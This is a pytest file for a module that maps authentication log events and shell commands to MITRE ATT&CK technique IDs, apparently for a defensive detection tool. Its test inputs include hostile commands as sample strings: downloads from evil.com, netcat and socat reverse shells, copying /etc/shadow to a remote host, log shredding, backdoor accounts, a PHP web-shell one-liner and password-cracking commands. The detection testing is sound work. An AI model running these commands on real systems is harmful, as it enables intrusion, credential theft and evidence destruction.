"""Tests for src/mitre.py"""

import pytest

from mitre import map_event, map_command, MITRE_MAP, SUSPICIOUS_COMMANDS


class TestMapEvent:
    def test_failed_login(self):
        mid, name = map_event('Failed Login')
        assert mid == 'T1110'
        assert 'Brute Force' in name

    def test_invalid_user(self):
        mid, name = map_event('Invalid User')
        assert mid == 'T1110.001'

    def test_auth_failure(self):
        mid, _ = map_event('Auth Failure')
        assert mid == 'T1110'

    def test_accepted_password(self):
        mid, name = map_event('Accepted Password')
        assert mid == 'T1078'
        assert 'Valid Accounts' in name

    def test_accepted_publickey(self):
        mid, name = map_event('Accepted Publickey')
        assert mid == 'T1078'

    def test_session_opened(self):
        mid, name = map_event('Session Opened')
        assert mid == 'T1021.004'
        assert 'SSH' in name

    def test_sudo_command(self):
        mid, name = map_event('Sudo Command')
        assert mid == 'T1548.003'
        assert 'Sudo' in name

    def test_session_closed_returns_none(self):
        mid, name = map_event('Session Closed')
        assert mid is None
        assert name is None

    def test_connection_closed_returns_none(self):
        mid, _ = map_event('Connection Closed')
        assert mid is None

    def test_disconnected_returns_none(self):
        mid, _ = map_event('Disconnected')
        assert mid is None

    def test_unknown_event_returns_none(self):
        mid, name = map_event('SomeUnknownEvent')
        assert mid is None
        assert name is None

    def test_all_known_types_return_tuples(self):
        for event_type in MITRE_MAP:
            result = map_event(event_type)
            assert isinstance(result, tuple)
            assert len(result) == 2


class TestMapCommand:
    def test_wget(self):
        mid, name = map_command('wget http://evil.com/payload')
        assert mid == 'T1105'

    def test_curl(self):
        mid, name = map_command('curl -O http://evil.com')
        assert mid == 'T1105'

    def test_chmod(self):
        mid, name = map_command('chmod +x /tmp/evil.sh')
        assert mid == 'T1222'

    def test_nc(self):
        mid, _ = map_command('nc -e /bin/sh 1.2.3.4 4444')
        assert mid == 'T1059'

    def test_python(self):
        mid, _ = map_command('python -c "import socket..."')
        assert mid == 'T1059.006'

    def test_python3(self):
        mid, _ = map_command('python3 exploit.py')
        assert mid == 'T1059.006'

    def test_bash(self):
        mid, name = map_command('bash -i')
        assert mid == 'T1059.004'

    def test_whoami(self):
        mid, name = map_command('whoami')
        assert mid == 'T1033'

    def test_crontab(self):
        mid, name = map_command('crontab -e')
        assert mid == 'T1053.003'

    def test_full_path_stripped(self):
        mid, _ = map_command('/usr/bin/wget http://evil.com')
        assert mid == 'T1105'

    def test_unknown_command(self):
        mid, name = map_command('ls -la /tmp')
        assert mid is None
        assert name is None

    def test_empty_string(self):
        mid, name = map_command('')
        assert mid is None

    def test_whitespace_only(self):
        mid, name = map_command('   ')
        assert mid is None

    # ── Defense Evasion ───────────────────────────────────────────────────────
    def test_shred(self):
        mid, _ = map_command('shred -u /var/log/auth.log')
        assert mid == 'T1070.002'

    def test_truncate(self):
        mid, _ = map_command('truncate -s 0 /var/log/syslog')
        assert mid == 'T1070.002'

    def test_history(self):
        mid, _ = map_command('history -c')
        assert mid == 'T1070.003'

    def test_unset(self):
        mid, _ = map_command('unset HISTFILE')
        assert mid == 'T1070.003'

    # ── Discovery ─────────────────────────────────────────────────────────────
    def test_uname(self):
        mid, _ = map_command('uname -a')
        assert mid == 'T1082'

    def test_hostname(self):
        mid, _ = map_command('hostname')
        assert mid == 'T1082'

    def test_ps(self):
        mid, _ = map_command('ps aux')
        assert mid == 'T1057'

    def test_netstat(self):
        mid, _ = map_command('netstat -tulnp')
        assert mid == 'T1049'

    def test_ss(self):
        mid, _ = map_command('ss -anp')
        assert mid == 'T1049'

    def test_ifconfig(self):
        mid, _ = map_command('ifconfig')
        assert mid == 'T1016'

    def test_ip(self):
        mid, _ = map_command('ip addr show')
        assert mid == 'T1016'

    def test_find(self):
        mid, _ = map_command('find / -name "*.conf"')
        assert mid == 'T1083'

    def test_nmap(self):
        mid, _ = map_command('nmap -sV 192.168.1.0/24')
        assert mid == 'T1046'

    def test_masscan(self):
        mid, _ = map_command('masscan -p80 10.0.0.0/8')
        assert mid == 'T1046'

    # ── Lateral Movement / Exfiltration ───────────────────────────────────────
    def test_ssh(self):
        mid, _ = map_command('ssh root@10.0.0.5')
        assert mid == 'T1021.004'

    def test_scp(self):
        mid, _ = map_command('scp /etc/shadow root@10.0.0.5:/tmp/')
        assert mid == 'T1048'

    def test_rsync(self):
        mid, _ = map_command('rsync -avz /data/ root@10.0.0.5:/exfil/')
        assert mid == 'T1048'

    def test_ftp(self):
        mid, _ = map_command('ftp 10.0.0.5')
        assert mid == 'T1048'

    def test_sftp(self):
        mid, _ = map_command('sftp user@10.0.0.5')
        assert mid == 'T1048'

    # ── Archive / Staging ─────────────────────────────────────────────────────
    def test_tar(self):
        mid, _ = map_command('tar czf /tmp/data.tgz /home/')
        assert mid == 'T1560.001'

    def test_zip(self):
        mid, _ = map_command('zip -r /tmp/out.zip /home/')
        assert mid == 'T1560.001'

    def test_gzip(self):
        mid, _ = map_command('gzip /tmp/dump.sql')
        assert mid == 'T1560.001'

    def test_base64(self):
        mid, _ = map_command('base64 /etc/shadow')
        assert mid == 'T1132.001'

    # ── Persistence ───────────────────────────────────────────────────────────
    def test_useradd(self):
        mid, _ = map_command('useradd -m backdoor')
        assert mid == 'T1136.001'

    def test_adduser(self):
        mid, _ = map_command('adduser backdoor')
        assert mid == 'T1136.001'

    def test_usermod(self):
        mid, _ = map_command('usermod -aG sudo backdoor')
        assert mid == 'T1098'

    # ── Credential Access ─────────────────────────────────────────────────────
    def test_john(self):
        mid, _ = map_command('john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt')
        assert mid == 'T1110.002'

    def test_hashcat(self):
        mid, _ = map_command('hashcat -m 1800 hash.txt wordlist.txt')
        assert mid == 'T1110.002'

    def test_hydra(self):
        mid, _ = map_command('hydra -l root -P pass.txt ssh://10.0.0.5')
        assert mid == 'T1110.001'

    # ── Execution (additional interpreters) ───────────────────────────────────
    def test_perl(self):
        mid, _ = map_command('perl -e "use Socket;..."')
        assert mid == 'T1059'

    def test_ruby(self):
        mid, _ = map_command('ruby exploit.rb')
        assert mid == 'T1059'

    def test_php(self):
        mid, _ = map_command('php -r "system($_GET[cmd]);"')
        assert mid == 'T1059'

    def test_socat(self):
        mid, _ = map_command('socat TCP:10.0.0.5:4444 EXEC:/bin/bash')
        assert mid == 'T1071'

    # ── Full path stripping works for new commands ─────────────────────────────
    def test_full_path_useradd(self):
        mid, _ = map_command('/usr/sbin/useradd -m backdoor')
        assert mid == 'T1136.001'

    def test_full_path_nmap(self):
        mid, _ = map_command('/usr/bin/nmap -sV 10.0.0.0/24')
        assert mid == 'T1046'


class TestMapEventExtended:
    def test_service_stopped(self):
        mid, name = map_event('Service Stopped')
        assert mid == 'T1489'
        assert 'Service Stop' in name

    def test_service_started_unchanged(self):
        mid, name = map_event('Service Started')
        assert mid == 'T1543.002'

    def test_web_shell_unchanged(self):
        mid, _ = map_event('Web Shell')
        assert mid == 'T1505.003'
